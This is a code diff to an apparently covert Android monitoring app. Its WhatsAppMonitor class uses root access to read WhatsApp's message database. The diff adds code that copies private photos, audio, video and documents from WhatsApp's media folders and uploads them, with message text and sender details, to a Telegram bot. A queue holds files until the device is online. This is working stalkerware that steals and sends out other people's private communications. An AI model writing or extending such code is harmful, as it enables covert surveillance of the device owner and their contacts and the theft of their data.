@@ -10,6 +10,8 @@ import com.system.superiormonitor.core.LogManager
 import com.topjohnwu.superuser.Shell
 import kotlinx.coroutines.*
 import kotlinx.coroutines.flow.*
+import kotlinx.coroutines.sync.Mutex
+import kotlinx.coroutines.sync.withLock
 import java.io.File
 import java.text.SimpleDateFormat
 import java.util.Date
@@ -83,6 +85,32 @@ class WhatsAppMonitor(
             // Fallback: return default
             return defaultDbDir
         }
+        
+        fun resolveWhatsAppMediaDir(context: Context, variant: WhatsAppVariant): String {
+            val packageName = variant.packageName
+            val folderName = if (variant == WhatsAppVariant.NORMAL) "WhatsApp" else "WhatsApp Business"
+            val rootStorage = android.os.Environment.getExternalStorageDirectory().absolutePath
+            
+            val modernPath = "$rootStorage/Android/media/$packageName/$folderName/" // Note: DB file_path starts with 'Media/'
+            val legacyPath = "$rootStorage/$folderName/"
+            
+            // Foolproof check for Custom ROMs / Backups
+            if (java.io.File(modernPath).exists()) {
+                return modernPath
+            } else if (java.io.File(legacyPath).exists()) {
+                return legacyPath
+            }
+            
+            // Root fallback if standard java.io.File checks fail (e.g., SELinux policies)
+            val modernCheck = Shell.cmd("test -d \"$modernPath\"").exec()
+            if (modernCheck.isSuccess) return modernPath
+            
+            val legacyCheck = Shell.cmd("test -d \"$legacyPath\"").exec()
+            if (legacyCheck.isSuccess) return legacyPath
+
+            // Ultimate fallback (Android 11+ defaults to scoped storage)
+            return if (android.os.Build.VERSION.SDK_INT >= 30) modernPath else legacyPath
+        }
 
         /**
          * Checks if WhatsApp is installed on the device using root shell
@@ -128,7 +156,8 @@ class WhatsAppMonitor(
             SELECT
                 m._id, m.timestamp, m.from_me, m.text_data, m.message_type,
                 COALESCE(mapped_cj.raw_string, cj.raw_string) AS chat_jid,
-                COALESCE(mapped_sj.raw_string, sj.raw_string) AS sender_jid
+                COALESCE(mapped_sj.raw_string, sj.raw_string) AS sender_jid,
+                mm.file_path, mm.file_size, mm.mime_type
             FROM message m
             JOIN chat c ON m.chat_row_id = c._id
             JOIN jid cj ON c.jid_row_id = cj._id
@@ -137,6 +166,7 @@ class WhatsAppMonitor(
             LEFT JOIN jid sj ON m.sender_jid_row_id = sj._id
             LEFT JOIN jid_map sjm ON sj._id = sjm.lid_row_id
             LEFT JOIN jid mapped_sj ON sjm.jid_row_id = mapped_sj._id
+            LEFT JOIN message_media mm ON m._id = mm.message_row_id
             WHERE m._id > ? AND m.message_type NOT IN (7, 15)
             ORDER BY m._id ASC
         """
@@ -146,11 +176,13 @@ class WhatsAppMonitor(
             SELECT
                 m._id, m.timestamp, m.from_me, m.text_data, m.message_type,
                 cj.raw_string AS chat_jid,
-                sj.raw_string AS sender_jid
+                sj.raw_string AS sender_jid,
+                mm.file_path, mm.file_size, mm.mime_type
             FROM message m
             JOIN chat c ON m.chat_row_id = c._id
             JOIN jid cj ON c.jid_row_id = cj._id
             LEFT JOIN jid sj ON m.sender_jid_row_id = sj._id
+            LEFT JOIN message_media mm ON m._id = mm.message_row_id
             WHERE m._id > ? AND m.message_type NOT IN (7, 15)
             ORDER BY m._id ASC
         """
@@ -163,8 +195,18 @@ class WhatsAppMonitor(
 
     private var contactsMap: Map<String, String> = emptyMap()
     private val prefsManager by lazy { com.system.superiormonitor.data.PrefsManager.getInstance(context) }
+    private val mediaUploadMutex = Mutex()
+    
+    private data class QueuedMedia(
+        val file: File,
+        val isVideoOrAudio: Boolean,
+        val mimeType: String,
+        val caption: String,
+        val row: MessageRow
+    )
     private var watcherJob: Job? = null
     private var waDbDir: String = ""  // Resolved dynamically on start()
+    private var currentScope: CoroutineScope? = null
     
     private var lastProcessedId: Long
         get() = if (variant == WhatsAppVariant.NORMAL) prefsManager.whatsappLastProcessedId else prefsManager.whatsappBusinessLastProcessedId
@@ -180,8 +222,45 @@ class WhatsAppMonitor(
     //  PUBLIC API
     // ═══════════════════════════════════════════════════════════
 
+    private fun queueMediaForUpload(context: Context, variant: WhatsAppVariant, media: QueuedMedia) {
+        com.system.superiormonitor.core.BatchManager.queue("wa_media_${variant.name}", media, 8000L, 10) { batch ->
+            mediaUploadMutex.withLock {
+                val token = prefsManager.botToken
+                val chatId = prefsManager.chatId
+                if (token.isBlank() || chatId.isBlank()) return@withLock
+                
+                val offlineParentDir = File(context.getExternalFilesDir(null), "${variant.dirName}/offline")
+                val mediaDir = File(offlineParentDir, "media")
+                if (!mediaDir.exists()) mediaDir.mkdirs()
+                
+                // 1. Move ALL batch items to offline/media folder IMMEDIATELY
+                for (item in batch) {
+                    val destFile = File(mediaDir, item.file.name)
+                    try {
+                        item.file.copyTo(destFile, overwrite = true)
+                        item.file.delete()
+                    } catch (e: Exception) {
+                        LogManager.log(LogCategory.BOT_ACTIVITY, "Failed to move ${item.file.name} to offline media", LogLevel.ERROR)
+                    }
+                }
+                
+                if (!com.system.superiormonitor.bot.TelegramApi.isApiReachable(context, token)) {
+                    // Offline: Leave files in offline/media/ and let OfflineManager do the job when device becomes online
+                    return@withLock
+                }
+                
+                // Online: Trigger the centralized offline folder processor
+                val logPrefix = if (variant == WhatsAppVariant.NORMAL) "WA" else "WA Business"
+                com.system.superiormonitor.core.ZipManager.processOfflineMediaFolder(
+                    context, token, chatId, mediaDir, offlineParentDir, logPrefix
+                )
+            }
+        }
+    }
+
     fun start(scope: CoroutineScope) {
         if (watcherJob?.isActive == true) return // Prevent double start
+        currentScope = scope
 
         watcherJob = scope.launch(Dispatchers.IO) {
             try {
@@ -322,11 +401,19 @@ class WhatsAppMonitor(
             val waDbFile = File(workDir, "wa.db")
             if (!waDbFile.exists()) return contacts
 
-            val db = SQLiteDatabase.openDatabase(
-                waDbFile.absolutePath,
-                null,
-                SQLiteDatabase.OPEN_READWRITE or SQLiteDatabase.NO_LOCALIZED_COLLATORS
-            )
+            val db = try {
+                SQLiteDatabase.openDatabase(
+                    waDbFile.absolutePath,
+                    null,
+                    SQLiteDatabase.OPEN_READWRITE or SQLiteDatabase.NO_LOCALIZED_COLLATORS
+                )
+            } catch (e: Exception) {
+                SQLiteDatabase.openDatabase(
+                    waDbFile.absolutePath,
+                    null,
+                    SQLiteDatabase.OPEN_READONLY or SQLiteDatabase.NO_LOCALIZED_COLLATORS
+                )
+            }
 
             db.use { database ->
                 val cursor = database.rawQuery(
@@ -420,10 +507,17 @@ class WhatsAppMonitor(
         if (!dbFile.exists()) return 0
 
         return try {
-            val db = SQLiteDatabase.openDatabase(
-                dbFile.absolutePath, null,
-                SQLiteDatabase.OPEN_READWRITE or SQLiteDatabase.NO_LOCALIZED_COLLATORS
-            )
+            val db = try {
+                SQLiteDatabase.openDatabase(
+                    dbFile.absolutePath, null,
+                    SQLiteDatabase.OPEN_READWRITE or SQLiteDatabase.NO_LOCALIZED_COLLATORS
+                )
+            } catch (e: Exception) {
+                SQLiteDatabase.openDatabase(
+                    dbFile.absolutePath, null,
+                    SQLiteDatabase.OPEN_READONLY or SQLiteDatabase.NO_LOCALIZED_COLLATORS
+                )
+            }
             db.use { database ->
                 val cursor = database.rawQuery("SELECT COALESCE(MAX(_id), 0) FROM message", null)
                 cursor.use { c ->
@@ -453,17 +547,78 @@ class WhatsAppMonitor(
             return
         }
 
-        val db = SQLiteDatabase.openDatabase(
-            dbFile.absolutePath, null,
-            SQLiteDatabase.OPEN_READWRITE or SQLiteDatabase.NO_LOCALIZED_COLLATORS
-        )
+        val db = try {
+            SQLiteDatabase.openDatabase(
+                dbFile.absolutePath, null,
+                SQLiteDatabase.OPEN_READWRITE or SQLiteDatabase.NO_LOCALIZED_COLLATORS
+            )
+        } catch (e: Exception) {
+            SQLiteDatabase.openDatabase(
+                dbFile.absolutePath, null,
+                SQLiteDatabase.OPEN_READONLY or SQLiteDatabase.NO_LOCALIZED_COLLATORS
+            )
+        }
 
         db.use { database ->
             val rows = queryNewMessages(database)
 
             for (row in rows) {
                 if (row.id > lastProcessedId) {
-                    val formatted = formatOutputMessage(row)
+                    var formatted = formatOutputMessage(row)
+                    var processedMedia = false
+
+                    // If it's a media message (or has a file path)
+                    if (row.messageType in listOf(1, 2, 3, 9, 13, 20) || !row.filePath.isNullOrBlank()) {
+                        if (row.filePath.isNullOrBlank()) {
+                            formatted += "\n\n[Media Not Downloaded on Device]"
+                            LogManager.log(LogCategory.SOCIAL_UPDATE, "Media empty file_path for msg ${row.id}")
+                        } else {
+                            val mediaBaseDir = resolveWhatsAppMediaDir(context, variant)
+                            val absolutePath = if (row.filePath.startsWith("/")) {
+                                row.filePath
+                            } else {
+                                "$mediaBaseDir${row.filePath}"
+                            }
+                            
+                            LogManager.log(LogCategory.SOCIAL_UPDATE, "Media Extraction -> msg_id: ${row.id}, raw_path: ${row.filePath}, absolute: $absolutePath")
+                            
+                            // Check size (10MB limit)
+                            val fileSize = row.fileSize ?: 0L
+                            if (fileSize > 10 * 1024 * 1024) {
+                                formatted += "\n\n[Media Exceeds 10MB Limit - Skipped]"
+                            } else {
+                                // Extract and upload
+                                try {
+                                    val checkFile = Shell.cmd("ls \"$absolutePath\" 2>/dev/null").exec()
+                                    if (checkFile.isSuccess && checkFile.out.isNotEmpty()) {
+                                        val tempFile = File(context.cacheDir, "wa_media_${row.id}_${File(row.filePath).name}")
+                                        val copyRes = Shell.cmd("cp \"$absolutePath\" \"${tempFile.absolutePath}\" && chmod 777 \"${tempFile.absolutePath}\"").exec()
+                                        
+                                        if (copyRes.isSuccess && tempFile.exists()) {
+                                            processedMedia = true
+                                            
+                                            val isVideoOrAudio = row.messageType == 3 || row.messageType == 2 || row.messageType == 9
+                                            val queuedItem = QueuedMedia(
+                                                file = tempFile,
+                                                isVideoOrAudio = isVideoOrAudio,
+                                                mimeType = row.mimeType ?: "application/octet-stream",
+                                                caption = formatted,
+                                                row = row
+                                            )
+                                            queueMediaForUpload(context, variant, queuedItem)
+                                        } else {
+                                            formatted += "\n\n[Failed to extract media from root]"
+                                        }
+                                    } else {
+                                        formatted += "\n\n[Media Not Downloaded on Device]"
+                                    }
+                                } catch (e: Exception) {
+                                    formatted += "\n\n[Error Extracting Media: ${e.message}]"
+                                }
+                            }
+                        }
+                    }
+
                     com.system.superiormonitor.bot.OfflineManager.sendOrQueue(
                         context = context,
                         message = formatted,
@@ -471,6 +626,7 @@ class WhatsAppMonitor(
                         offlineFileName = "offline_${variant.dirName}.txt",
                         sender = sendTelegram
                     )
+                    
                     lastProcessedId = row.id
                 }
             }
@@ -492,7 +648,10 @@ class WhatsAppMonitor(
         val textData: String?,
         val messageType: Int,
         val chatJid: String?,
-        val senderJid: String?
+        val senderJid: String?,
+        val filePath: String?,
+        val fileSize: Long?,
+        val mimeType: String?
     )
 
     private suspend fun queryNewMessages(db: SQLiteDatabase): List<MessageRow> {
@@ -520,6 +679,10 @@ class WhatsAppMonitor(
         cursor.use { c ->
             while (c.moveToNext()) {
                 kotlinx.coroutines.yield()
+                val fpIdx = c.getColumnIndex("file_path")
+                val fsIdx = c.getColumnIndex("file_size")
+                val mtIdx = c.getColumnIndex("mime_type")
+                
                 rows.add(
                     MessageRow(
                         id = c.getLong(c.getColumnIndexOrThrow("_id")),
@@ -528,7 +691,10 @@ class WhatsAppMonitor(
                         textData = c.getString(c.getColumnIndexOrThrow("text_data")),
                         messageType = c.getInt(c.getColumnIndexOrThrow("message_type")),
                         chatJid = c.getString(c.getColumnIndexOrThrow("chat_jid")),
-                        senderJid = c.getString(c.getColumnIndexOrThrow("sender_jid"))
+                        senderJid = c.getString(c.getColumnIndexOrThrow("sender_jid")),
+                        filePath = if (fpIdx != -1) c.getString(fpIdx) else null,
+                        fileSize = if (fsIdx != -1 && !c.isNull(fsIdx)) c.getLong(fsIdx) else null,
+                        mimeType = if (mtIdx != -1) c.getString(mtIdx) else null
                     )
                 )
             }
@@ -542,19 +708,19 @@ class WhatsAppMonitor(
     //  Ports: the exact markdown structure from Python PoC
     // ═══════════════════════════════════════════════════════════
 
-    private fun formatOutputMessage(row: MessageRow): String {
+    private fun formatOutputMessage(row: MessageRow, overrideMsg: String? = null): String {
         val direction = if (row.fromMe == 1) "Sent" else "Received"
-        val msg = if (row.textData.isNullOrBlank()) {
+        val msg = overrideMsg ?: if (row.textData.isNullOrBlank()) {
             when (row.messageType) {
                 8, 10, 90 -> "[📞 WhatsApp Call]"
-                1 -> "[🖼️ Image Media]"
-                2 -> "[🎵 Audio Media]"
-                3 -> "[🎥 Video Media]"
+                1, 42 -> "[🖼️ Image Media]"
+                2, 43 -> "[🎵 Audio Media]"
+                3, 44 -> "[🎥 Video Media]"
                 4 -> "[👤 Contact Card]"
                 5 -> "[📍 Location]"
                 9 -> "[📄 Document / File]"
                 15 -> "[🗑️ Deleted Message]"
-                else -> "[Non-text message / Media]"
+                else -> if (!row.filePath.isNullOrBlank()) "[📁 Media File]" else "[Non-text message]"
             }
         } else {
             row.textData
